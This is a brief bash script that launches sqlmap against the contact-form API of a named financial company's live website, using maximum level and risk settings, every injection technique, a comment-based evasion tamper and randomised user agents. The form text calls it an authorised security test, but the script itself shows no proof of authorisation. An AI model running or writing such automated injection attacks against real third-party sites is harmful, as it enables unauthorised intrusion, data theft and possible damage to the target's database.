#!/bin/bash
cd /tmp
T='https://www.infinitycapital.bh/api/send'
D='fname=VaptQA&lname=Tester&areacode=%2B973&tel=3600000&cname=vapt-qa&subject=Inquiry&msg=Authorized+security+test+message&check=on&targets=%5B%22info%40infinitycapital.bh%22%5D'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
timeout 1400 sqlmap -u "$T" --data "$D" --method POST \
  --headers "Accept: application/json/*|Origin: https://www.infinitycapital.bh|User-Agent: $UA" \
  --batch --level=5 --risk=3 --technique=BEUSTQ --threads=1 --delay=0.6 \
  --tamper=space2comment --random-agent 2>&1 | tail -70